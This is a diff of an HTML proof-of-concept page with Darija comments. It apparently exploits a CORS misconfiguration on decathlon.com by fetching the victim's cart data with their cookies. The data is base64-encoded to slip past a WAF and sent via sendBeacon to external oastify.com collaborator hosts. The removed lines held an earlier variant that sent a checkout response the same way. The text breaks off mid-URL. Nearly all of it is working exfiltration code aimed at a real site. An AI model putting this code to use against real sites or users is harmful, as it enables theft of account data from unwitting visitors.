@@ -1,12 +1,31 @@
-<script>
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://www.decathlon.com/shopify_pay/accelerated_checkout", true);
-    xhr.withCredentials = true; // هادي هي اللي كتجر الكوكيز
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState == 4) {
-            // صيفط الداتا نيشان لـ Collaborator بلا تشفير (باش مايعيقش الـ WAF)
-            navigator.sendBeacon("https://wyyhvq59d4egnh9kivak8rujsay1m0ap.oastify.com/?data=" + xhr.responseText.substring(0,100));
-        }
-    };
-    xhr.send();
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PoC - Account Data Exfiltration</title>
+</head>
+<body>
+    <h1>Testing... Please wait.</h1>
+    <script>
+        // هاد الكود كيستغل ثغرة الـ CORS اللي كتيق فـ الدومين ديالك
+        fetch("https://www.decathlon.com/cart.json", {
+            method: "GET",
+            credentials: "include" // ضروري باش يجر الكوكيز ديال الضحية
+        })
+        .then(response => {
+            if (!response.ok) throw new Error('Network response was not ok');
+            return response.json();
+        })
+        .then(data => {
+            // تحويل البيانات لـ Base64 باش تهرب من الـ WAF وتوصل لـ Collaborator
+            let encodedData = btoa(JSON.stringify(data));
+            
+            // إرسال "الغنيمة" لـ Collaborator ديالك
+            navigator.sendBeacon("laz67fhyptq5z6l9ukm9kg684zaqyqmf.oastify.com?exfil=" + encodedData);
+            
+            console.log("Data sent to collaborator!");
+        })
+        .catch(error => {
+            console.error("Fetch error:", error);
+            // محاولة إرسال الخطأ لـ Collaborator للتشخيص
+            navigator.sendBeacon("https://bq5fhfaet10n0yflkr53beqvbmhd58
